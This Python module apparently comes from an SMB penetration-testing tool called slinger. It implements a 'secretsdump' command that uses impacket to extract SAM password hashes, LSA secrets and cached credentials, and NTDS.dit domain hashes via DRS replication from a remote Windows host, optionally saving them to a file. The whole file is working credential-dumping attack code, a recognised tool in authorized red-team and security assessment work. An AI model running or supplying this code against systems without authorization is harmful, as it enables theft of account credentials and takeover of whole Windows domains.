import os
import sys

from slingerpkg.utils.printlib import *


class secrets:
    def __init__(self):
        print_debug("Secrets Module Loaded!")

    def secretsdump(self, args):
        """Dump secrets from the remote system using the existing SMB session.

        Uses impacket's RemoteOperations with self.conn — no new connections.
        Supports SAM hashes, LSA secrets (cached creds, service passwords),
        and NTDS.dit (domain controllers only via DRS replication).
        """
        from impacket.examples.secretsdump import (
            RemoteOperations,
            SAMHashes,
            LSASecrets,
            NTDSHashes,
        )

        # Determine what to dump
        dump_sam = getattr(args, "sam", False)
        dump_lsa = getattr(args, "lsa", False)
        dump_ntds = getattr(args, "ntds", False)
        just_dc_ntlm = getattr(args, "just_dc_ntlm", False)
        history = getattr(args, "history", False)
        output_file = getattr(args, "output", None)

        # If --ntds with --just-dc-ntlm, skip SAM/LSA
        if just_dc_ntlm:
            dump_ntds = True
            dump_sam = False
            dump_lsa = False

        # Default: SAM + LSA
        if not dump_sam and not dump_lsa and not dump_ntds:
            dump_sam = True
            dump_lsa = True

        # Require share connection
        if not self.check_if_connected():
            return

        # Collect output
        collected_secrets = []

        def secret_callback(*args):
            """Called for each extracted secret.

            SAM passes (secret,), LSA/NTDS passes (secretType, secret).
            """
            secret = args[-1] if args else None
            if secret is not None:
                print(secret)
                collected_secrets.append(str(secret))

        # Use existing SMB connection — no re-auth
        use_kerberos = getattr(self, "use_kerberos", False)
        remote_ops = None
        sam_hashes = None
        lsa_secrets = None
        ntds_hashes = None

        try:
            remote_ops = RemoteOperations(self.conn, use_kerberos, kdcHost=None)

            # Enable registry for SAM/LSA
            if dump_sam or dump_lsa:
                print_info("Enabling registry access...")
                remote_ops.enableRegistry()
                boot_key = remote_ops.getBootKey()
                no_lm_hash = remote_ops.checkNoLMHashPolicy()

            # SAM hashes
            if dump_sam:
                print_info("Dumping SAM hashes...")
                try:
                    sam_file = remote_ops.saveSAM()
                    sam_hashes = SAMHashes(
                        sam_file, boot_key, isRemote=True, perSecretCallback=secret_callback
                    )
                    sam_hashes.dump()
                except Exception as e:
                    try:
                        error_str = str(e)
                    except TypeError:
                        error_str = repr(e)
                    print_bad(f"SAM dump failed: {error_str}")

            # LSA secrets
            if dump_lsa:
                print_info("Dumping LSA secrets...")
                try:
                    security_file = remote_ops.saveSECURITY()
                    lsa_secrets = LSASecrets(
                        security_file,
                        boot_key,
                        remote_ops,
                        isRemote=True,
                        history=history,
                        perSecretCallback=secret_callback,
                    )
                    lsa_secrets.dumpCachedHashes()
                    lsa_secrets.dumpSecrets()
                except Exception as e:
                    try:
                        error_str = str(e)
                    except TypeError:
                        error_str = repr(e)
                    print_bad(f"LSA secrets dump failed: {error_str}")

            # NTDS.dit (domain controllers only)
            if dump_ntds:
                print_info("Dumping NTDS.dit via DRS replication...")
                try:
                    # For DRS we need boot key if not already obtained
                    if not dump_sam and not dump_lsa:
                        remote_ops.enableRegistry()
                        boot_key = remote_ops.getBootKey()
                        no_lm_hash = remote_ops.checkNoLMHashPolicy()

                    # Pre-check: try to connect SAMR to verify DC
                    try:
                        domain_name = remote_ops.getMachineNameAndDomain()[1]
                        print_info(f"Domain: {domain_name}")
                        remote_ops.connectSamr(domain_name)
                        print_debug("SAMR connection established — target is a DC")
                    except Exception as e:
                        try:
                            error_str = str(e)
                        except TypeError:
                            error_str = repr(e)
                        print_bad(
                            f"Cannot connect to SAMR — target may not be a domain controller: {error_str}"
                        )
                        return

                    ntds_hashes = NTDSHashes(
                        None,
                        boot_key,
                        isRemote=True,
                        history=history,
                        noLMHash=no_lm_hash,
                        remoteOps=remote_ops,
                        justNTLM=just_dc_ntlm,
                        perSecretCallback=secret_callback,
                    )
                    ntds_hashes.dump()
                except Exception as e:
                    try:
                        error_str = str(e)
                    except TypeError:
                        error_str = repr(e)
                    if "ERROR_DS_DRA_BAD_DN" in error_str:
                        print_bad("NTDS dump failed — target may not be a domain controller")
                    else:
                        print_bad(f"NTDS dump failed: {error_str}")

            # Summary
            if collected_secrets:
                print_good(f"Extracted {len(collected_secrets)} secret(s)")

                # Save to file if requested
                if output_file:
                    with open(output_file, "w") as f:
                        f.write("\n".join(collected_secrets) + "\n")
                    print_good(f"Secrets saved to {output_file}")

                details = []
                if dump_sam:
                    details.append("SAM")
                if dump_lsa:
                    details.append("LSA")
                if dump_ntds:
                    details.append("NTDS")
                self._track("EXEC", "secretsdump", self.host, "+".join(details))
            else:
                print_warning("No secrets extracted")

        except Exception as e:
            try:
                error_str = str(e)
            except TypeError:
                error_str = repr(e)
            print_bad(f"Secretsdump error: {error_str}")
            print_debug(f"Traceback:", sys.exc_info())

        finally:
            # Cleanup — restore registry state, delete temp hive files
            try:
                if sam_hashes:
                    sam_hashes.finish()
            except Exception:
                pass
            try:
                if lsa_secrets:
                    lsa_secrets.finish()
            except Exception:
                pass
            try:
                if ntds_hashes:
                    ntds_hashes.finish()
            except Exception:
                pass
            try:
                if remote_ops:
                    remote_ops.finish()
            except Exception:
                pass
            # RemoteOperations sets a 5-min timeout; no reliable way to restore
            # the original since getTimeout() doesn't exist in all impacket versions
